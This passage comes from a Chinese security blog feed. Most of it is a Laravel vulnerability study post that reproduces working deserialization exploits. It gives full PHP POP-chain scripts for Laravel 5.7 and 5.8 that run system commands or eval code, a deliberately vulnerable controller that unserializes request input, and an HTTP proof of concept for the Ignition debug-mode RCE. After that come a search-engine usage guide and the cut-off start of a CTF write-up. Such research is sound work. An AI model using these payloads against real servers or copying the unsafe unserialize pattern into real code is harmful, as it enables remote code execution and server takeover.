class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            unserialize($code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Welcome to laravel5.7"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 laravel57/routes/web.php 文件中添加一条路由，便于我们后续访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>,<span class="string">"DemoController@Demo"</span>);</span><br></pre></td></tr></table></figure><p>exp</p><p>放在public文件夹下执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings=$bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">genericuser</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>\<span class="title">GenericUser</span>(<span class="title">array</span>("<span class="title">expectedOutput</span>"=&gt;<span class="title">array</span>("0"=&gt;"1"),"<span class="title">expectedQuestions</span>"=&gt;<span class="title">array</span>("0"=&gt;"1")));</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>)));</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="string">"system"</span>,<span class="keyword">array</span>(<span class="string">'id'</span>),$genericuser,$application);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Laravel5-8-x反序列化POP链"><a href="#Laravel5-8-x反序列化POP链" class="headerlink" title="Laravel5.8.x反序列化POP链"></a>Laravel5.8.x反序列化POP链</h1><p><strong>exp1:</strong><br>详情可看 <a href="https://xz.aliyun.com/t/6059" target="_blank" rel="noopener">https://xz.aliyun.com/t/6059</a>   </p><p>在 laravel58/routes/web.php 文件添加路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">"/"</span>,<span class="string">"\App\Http\Controllers\DemoController@demo"</span>);</span><br></pre></td></tr></table></figure><p>在 laravel58/app/Http/Controllers/ 下添加 DemoController.php 控制器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">class DemoController extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> demo()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">            unserialize(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"Welcome to laravel5.8"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config, $code)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">line</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Line</span>();</span><br><span class="line">    $mockdefinition = <span class="keyword">new</span> Mockery\Generator\MockDefinition($line,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">    $evalloader = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    $dispatcher = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>($evalloader,<span class="string">'load'</span>));</span><br><span class="line">    $queuedcommand = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand($mockdefinition);</span><br><span class="line">    $pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingbroadcast));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>exp2:</strong><br>这条链来自前一阵CTF国赛某道题目。漏洞存在<code>symfony</code>组件中（影响至罪行<code>4.4.x-dev</code> 版本），而默认安装的 laravel5.8 框架没有包含该组件。为了复现该漏洞，我们需要将<code>composer.json</code> 文件中的 <code>require</code>添加 <code>&quot;symfony/symfony&quot;: &quot;4.*&quot;</code>并执行 <code>composer update</code>命令即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">expiry</span>;</span><br><span class="line">        <span class="keyword">protected</span> $poolHash;</span><br><span class="line">        <span class="keyword">protected</span> $innerItem;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($expiry, $poolHash, $command)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;expiry = $expiry;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;innerItem = $command;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ProxyAdapter</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">poolHash</span>;</span><br><span class="line">        <span class="keyword">private</span> $setInnerItem;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poolHash, $func)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setInnerItem = $func;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($deferred, $pool)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = $deferred;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">cacheitem</span> = <span class="title">new</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>(1,1,"<span class="title">whoami</span>");</span><br><span class="line">    $proxyadapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\ProxyAdapter(<span class="number">1</span>,<span class="string">'system'</span>);</span><br><span class="line">    $tagawareadapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\TagAwareAdapter(<span class="keyword">array</span>($cacheitem),$proxyadapter);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($tagawareadapter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Laravel-5-8-SQL-注入漏洞"><a href="#Laravel-5-8-SQL-注入漏洞" class="headerlink" title="Laravel 5.8 SQL 注入漏洞"></a>Laravel 5.8 SQL 注入漏洞</h1><p>Laravel 5.8.5以下版本<br><a href="https://xz.aliyun.com/t/5331" target="_blank" rel="noopener">https://xz.aliyun.com/t/5331</a></p><p>数据库添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create table users(</span><br><span class="line">id int  auto_increment,</span><br><span class="line">username varchar(250),</span><br><span class="line">password varchar(250),</span><br><span class="line">level int,</span><br><span class="line">primary key(id)</span><br><span class="line">);</span><br><span class="line">insert into users values(1,<span class="string">'admin'</span>,<span class="string">'admin'</span>,1);</span><br><span class="line">insert into users values(2,<span class="string">'user'</span>,<span class="string">'123456'</span>,2);</span><br><span class="line">insert into users values(3,<span class="string">'aaa'</span>,<span class="string">'bbb'</span>,3);</span><br></pre></td></tr></table></figure><h1 id="Laravel-lt-8-4-2-Debug模式-ignition远程代码执行漏洞"><a href="#Laravel-lt-8-4-2-Debug模式-ignition远程代码执行漏洞" class="headerlink" title="Laravel &lt;= 8.4.2 Debug模式 _ignition远程代码执行漏洞"></a>Laravel &lt;= 8.4.2 Debug模式 <code>_ignition</code>远程代码执行漏洞</h1><p>详细文章：<a href="https://whoamianony.top/2021/01/15/lou-dong-fu-xian/laravel/laravel-debug-mode-rce-cve-2021-3129-li-yong-fu-xian/" target="_blank" rel="noopener">https://whoamianony.top/2021/01/15/lou-dong-fu-xian/laravel/laravel-debug-mode-rce-cve-2021-3129-li-yong-fu-xian/</a>   </p><p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition功能的某些接口存在过滤不严，攻击者可以发起恶意请求，通过构造恶意Log文件等方式触发Phar反序列化，从而造成远程代码执行，控制服务器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/laravel/laravel.git</span><br><span class="line"><span class="built_in">cd</span> laravel</span><br><span class="line">git checkout e849812</span><br><span class="line">composer install</span><br><span class="line">composer require facade/ignition==2.5.1</span><br><span class="line">将.env.example修改为.env</span><br><span class="line">php artisan key:generate</span><br><span class="line">php artisan serve --host=0.0.0.0</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8000</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"solution"</span>: <span class="string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span>,</span><br><span class="line">  <span class="string">"parameters"</span>: &#123;</span><br><span class="line">    <span class="string">"variableName"</span>: <span class="string">"username"</span>,</span><br><span class="line">    <span class="string">"viewFile"</span>: <span class="string">"xxxxxxx"</span>//phar文件位置</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/php/laravel/1.png" alt=""></p><h1 id="Laravel-cookie"><a href="#Laravel-cookie" class="headerlink" title="Laravel cookie"></a>Laravel cookie</h1><p>Laravel发布安全更新，其中指出使用cookie session driver的应用受到漏洞影响，该漏洞会导致rce。<br><a href="https://blog.laravel.com/laravel-cookie-security-releases" target="_blank" rel="noopener">https://blog.laravel.com/laravel-cookie-security-releases</a><br><a href="http://x2y.pw/2020/08/06/Laravel-Cookie-Security%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://x2y.pw/2020/08/06/Laravel-Cookie-Security%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a><br>影响版本：&lt; v6.18.27，&lt; v7.22.0 </p><p>漏洞比较鸡肋，限制条件较多</p><ul><li>需要开启cookie session driver，默认是file driver</li><li>需要开发者特定的漏洞代码 cookie(‘key’, $value ，value的值完全可控</li><li>反序列化调用链</li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mochazz.github.io/2019/06/25/Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BRCE%E9%93%BE%E6%8C%96%E6%8E%98/" target="_blank" rel="noopener">Laravel5.7反序列化漏洞之RCE链挖掘</a><br><a href="https://xz.aliyun.com/t/5911" target="_blank" rel="noopener">Laravel5.8.x反序列化POP链</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;laravel漏洞学习&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>信安技术文章搜索引擎使用指南</title>
    <link href="https://blog.cfyqy.com/article/7b1c7182.html"/>
    <id>https://blog.cfyqy.com/article/7b1c7182.html</id>
    <published>2021-01-12T05:41:21.000Z</published>
    <updated>2021-01-13T02:06:24.277Z</updated>
    
    <content type="html"><![CDATA[<p>信安技术文章搜索引擎使用指南</p><a id="more"></a><h1 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h1><p>主界面包括最近文章、漏洞通告、威胁情报、安全资讯、站点收录、数据详情等功能模块。<br><strong>最近文章</strong>：显示最近五天发布的安全技术文章，默认每页显示7条，可通过下方的调整框来调整大小，每页显示的最大值为50条。<br><strong>漏洞通告</strong>：这里只显示 CNNVD 发布的漏洞通告。<br><strong>威胁情报</strong>：主要是国外站点发布的漏洞信息通告。<br><strong>安全资讯</strong>：一些安全的新闻消息<br><strong>站点收录</strong>：网站文章收录数量排名和前100名站点的文章数量比例饼图<br><strong>数据详情</strong>：有三个柱状图，分别显示近一周、近一年、近10年的数据情况<br><img src="../../images/security/secsea/1.png" alt=""></p><h1 id="搜索界面"><a href="#搜索界面" class="headerlink" title="搜索界面"></a>搜索界面</h1><p>搜索界面提供网页、标题、作者、日期、域名等搜索功能。</p><h2 id="内容搜索"><a href="#内容搜索" class="headerlink" title="内容搜索"></a>内容搜索</h2><p>输入关键字，点击搜索，默认使用的是网页搜索，网页搜索在标题、内容、作者、域名这四个字段中搜索符合关键字的内容，并按照一定的权重计算比分，将搜索结果中，比分较高的文章排在前面，也就是把最可能是你想找的文章排在前面。<br><img src="../../images/security/secsea/2.png" alt=""></p><h2 id="标题搜索"><a href="#标题搜索" class="headerlink" title="标题搜索"></a>标题搜索</h2><p>标题一般都能够揭示文章的范围或论点，通过标题搜索有些时候更能得到我们想要的文章<br><img src="../../images/security/secsea/3.png" alt=""></p><h2 id="作者搜索"><a href="#作者搜索" class="headerlink" title="作者搜索"></a>作者搜索</h2><p>搞安全的人，一般都会给自己取一个 id 名，QQ、微信等平台账号的账户名可能都是同一个id名，有时候想了解一些作者的主要研究方向，可以通过搜索id名，来查看其写的文章。<br><img src="../../images/security/secsea/4.png" alt=""></p><h2 id="日期搜索"><a href="#日期搜索" class="headerlink" title="日期搜索"></a>日期搜索</h2><p>可以通过调整起止日期，来查看某个期间的安全文章，可配合内容、标题、作者搜索。这里说明一下，有的文章在爬取过程中没有匹配到时间，就设置了一个默认的日期值为2011-11-11<br><img src="../../images/security/secsea/5.png" alt=""></p><h2 id="域名搜索"><a href="#域名搜索" class="headerlink" title="域名搜索"></a>域名搜索</h2><p>通过输入站点的域名，来查看该站点是否有被收录。<br><img src="../../images/security/secsea/6.png" alt=""></p><h2 id="站点搜索"><a href="#站点搜索" class="headerlink" title="站点搜索"></a>站点搜索</h2><p>提供每个被收录站点的数据搜索，可以先用域名搜索一下是否有被收录。<br>例如只想搜索先知社区里的文章。<br><img src="../../images/security/secsea/7.png" alt=""><br>想要阅读先知社区最近一周的文章，可搭配日期搜索<br><img src="../../images/security/secsea/8.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;信安技术文章搜索引擎使用指南&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>love_math学习</title>
    <link href="https://blog.cfyqy.com/article/5fb19bf9.html"/>
    <id>https://blog.cfyqy.com/article/5fb19bf9.html</id>
    <published>2020-12-29T15:03:41.000Z</published>
    <updated>2021-01-05T02:58:10.262Z</updated>
    
    <content type="html"><![CDATA[<p>[CISCN 2019 初赛]Love Math  </p><a id="more"></a><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = 